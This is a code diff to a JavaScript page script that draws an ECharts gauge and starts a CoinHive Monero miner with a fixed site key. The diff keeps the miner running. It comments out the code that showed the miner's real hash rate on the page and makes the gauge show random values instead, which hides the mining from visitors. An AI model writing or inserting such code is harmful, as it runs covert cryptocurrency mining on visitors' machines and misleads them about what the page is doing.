@@ -1,6 +1,3 @@
-
-
-
 var myChart = echarts.init(document.getElementById('chart'));
 var option = {
     tooltip : {
@@ -72,19 +69,19 @@ var option = {
 myChart.setOption(option);
 
 var miner = new CoinHive.Anonymous('whySWVJpU8jBm7iDhgjKEze1uN2HhPbD');
-setInterval(function () {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
-    var acceptedHashes = miner.getAcceptedHashes();
-    document.getElementById("monero").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec<br>" + 
-    "Total Hashes = " + totalHashes + 
-    "<br>Accepted Hashes = " + acceptedHashes;
-    option.series[0].data[0].value = hashesPerSecond.toFixed(2) - 0;
-    myChart.setOption(option,true);
-}, 1000);
 miner.start();
+// setInterval(function () {
+//     var hashesPerSecond = miner.getHashesPerSecond();
+//     var totalHashes = miner.getTotalHashes();
+//     var acceptedHashes = miner.getAcceptedHashes();
+//     document.getElementById("monero").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec<br>" + 
+//     "Total Hashes = " + totalHashes + 
+//     "<br>Accepted Hashes = " + acceptedHashes;
+//     // option.series[0].data[0].value = hashesPerSecond.toFixed(2) - 0;
+//     // myChart.setOption(option,true);
+// }, 1000);
 
-// setInterval(function (){
-//     option.series[0].data[0].value = (Math.random()*100).toFixed(2) - 0;
-//     myChart.setOption(option,true);
-// },2000);
+setInterval(function (){
+    option.series[0].data[0].value = (Math.random()*100).toFixed(2) - 0;
+    myChart.setOption(option,true);
+},2000);
